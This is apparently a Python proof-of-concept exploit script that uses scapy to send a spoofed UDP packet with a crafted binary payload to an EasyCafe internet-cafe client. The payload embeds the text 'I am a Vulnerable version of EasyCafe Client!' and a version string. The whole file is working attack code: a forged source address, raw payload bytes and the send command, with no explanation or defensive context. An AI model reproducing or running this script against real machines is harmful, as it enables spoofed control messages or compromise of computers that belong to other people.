from scapy.all import *
from scapy.layers import inet


sr_ip = '192.168.1.15'
ds_ip = '127.0.0.1'


pack = "þ\x00\x00\x00\x00\x00\x00\x00\\é\x00\x00\x01\x00\x00\x00<û\x12\x00cmáwF\x02\x02\x00\x12\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00²ÁF\x00F\x02\x02\x00\x12\x02\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00Dû\x12\x00ÊÁF\x00ÒÁF\x00ì\x00\x00\x00G\x01\x00\x00¤\x84w\x01\x00\x00\x00\x00`û\x12\x00¦µE\x00\x14\x00\x00\x00añA\x00\x80\x0bp\x01\x99\x00C\x00¡\x00C\x00G\x01\x00\x00\xa0\x0bp\x01ï²E\x00`û\x12\x00\x06³E\x00\x0e³E\x00$þ\x12\x00\x18³E\x00`û\x12\x00ì\x00\x00\x00G\x01\x00\x00¤\x84w\x01\\\x04r\x01xû\x12\x00Ú\x8bB\x00\x84\x00\x00\x00\x00\x00\x00\x00^\x01Õ\x01\x01\x00\x00\x00\x98û\x12\x00¨,áwà\x02\x01\x00\x84\x00\x00\x00\x00\x00\x00\x00^\x01Õ\x01G\x01\x00\x00Í«ºÜ´û\x12\x00dGáwS\x0f\x80\x01à\x02\x01\x00\x84\x00\x00\x00\x00\x00\x00\x00^\x01Õ\x01Üû\x12\x00 Gáw\x901\x8f\x00\x84\x00\x00\x00\x00\x00\x00\x000Gáw\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 ü\x12\x00ï\x15úwìû\x12\x00\x18\x00\x00\x00\x901\x8f\x00\x84\x00\x00\x00\x00\x00\x00\x00^\x01Õ\x01S\x0f\x80\x015GáwÀÕâwµ\x02\x0e\x00.I am  a Vulnerable version of EasyCafe Client!\x00F\x02\x02\x00\x00\x00\x00\x00G\x01\x00\x00ì\x00\x00\x00tü\x12\x00\x88qp\x01´¯~\x01hnF\x00h\x01e\x00T½r\x01¼\x87E\x00T½r\x01G\x01\x00\x00ì\x00\x00\x00\x90ü\x12\x00ì\x87E\x00:\x00\x00\x00D\x00\x00\x00\x10\x00\x00\x00\x01\x00\x00\x00\x10\x00\x00\x10´ü\x12\x00o\x88E\x00:\x00\x00\x00D\x00\x00\x00\x04\x02\x00\x00Tþ\x12\x00T½r\x01ìý\x12\x00\x04\x02\x00\x00ìý\x12\x00ô\x89E\x00\x00\x02\x00\x00T½r\x01Tþ\x12\x00ÿ\x85E\x00\x04\x02\x00\x00Tþ\x12\x00T½r\x01ÿ\x85E\x00<ÿ\x12\x00Tþ\x12\x00ð\x84r\x01ê\x04âw¨:\x8f\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x81÷wª®F\x00\x01\x00\x00\x00\x01\x00\x00\x00\\Ôw\x01Ðý\x12\x000ý\x12\x00Æ®F\x00ª®F\x00\x02\x00\x00\x00\x01\x00\x00\x00<\x0cw\x01Ðý\x12\x00\x062.2.14\x00ª®F\x00\n\x00\x00\x00\x01\x00\x00\x00Dñw\x01Ðý\x12\x00hý\x12\x00Æ®F\x00ª®F\x00\x00\x00\x00\x00\x18\x8cw\x01¤ý\x12\x00H®F\x01\x88ý\x12\x00^vF\x00Ðý\x12\x00\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01H®F\x000\x04x\x01¸ý\x12\x00)wF\x00¸ý\x12\x00\x00\x00\x00\x00Tþ\x12\x00\x00\x00\x00\x00èý\x01\x00\r\x00\x00\x00\x00\x00\x00\x00\x18\x8cw\x01H®F\x00\x00\x00\x00\x00Ðý\x12\x00"

send(inet.IP(src=sr_ip, dst=ds_ip) / inet.UDP(sport=800, dport=804) / pack)
